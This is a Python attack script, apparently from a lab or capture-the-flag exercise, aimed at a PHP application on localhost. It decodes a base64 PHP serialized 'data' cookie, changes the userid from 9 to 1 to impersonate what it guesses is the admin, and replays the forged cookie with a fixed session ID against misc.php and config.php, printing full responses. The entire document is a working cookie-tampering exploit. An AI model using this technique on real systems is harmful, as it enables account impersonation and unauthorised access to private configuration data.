import base64
import urllib.parse
import requests

# Original data cookie
original_data = "TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjk7czo4OiJ1c2VybmFtZSI7czo4OiJ0ZXN0dXNlciI7fQ%3D%3D"

decoded_url = urllib.parse.unquote(original_data)
decoded_base64 = base64.b64decode(decoded_url).decode('utf-8')

print("[+] Original decoded cookie:")
print(f"  URL decoded: {decoded_url}")
print(f"  Base64 decoded: {decoded_base64}")

# Modify user ID to 1 (admin?)
modified_payload = 'O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:8:"testuser";}'
encoded_modified = base64.b64encode(modified_payload.encode()).decode()
url_encoded_modified = urllib.parse.quote(encoded_modified)

print(f"\n[+] Modified payload (userid=1):")
print(f"  Modified string: {modified_payload}")
print(f"  Base64 encoded: {encoded_modified}")
print(f"  URL encoded: {url_encoded_modified}")

# Test accessing misc.php with original and modified cookies
cookies_original = {
    'data': decoded_url,
    'PHPSESSID': 'ca3885931b3dde5fc7c90d5b9f0754d6'
}

cookies_modified = {
    'data': url_encoded_modified,
    'PHPSESSID': 'ca3885931b3dde5fc7c90d5b9f0754d6'
}

base_url = "http://127.0.0.1"
endpoints = ['misc.php', 'config.php']

print(f"\n[+] Testing endpoints with original cookie (userid=9):")
for endpoint in endpoints:
    resp = requests.get(f"{base_url}/{endpoint}", cookies=cookies_original)
    print(f"  /{endpoint}: Status={resp.status_code}, Size={len(resp.content)}B")
    if resp.text:
        print(f"    Response: {resp.text[:500]}")

print(f"\n[+] Testing endpoints with modified cookie (userid=1):")
for endpoint in endpoints:
    resp = requests.get(f"{base_url}/{endpoint}", cookies=cookies_modified)
    print(f"  /{endpoint}: Status={resp.status_code}, Size={len(resp.content)}B")
    if resp.text:
        print(f"    Response: {resp.text}")  # Print full response
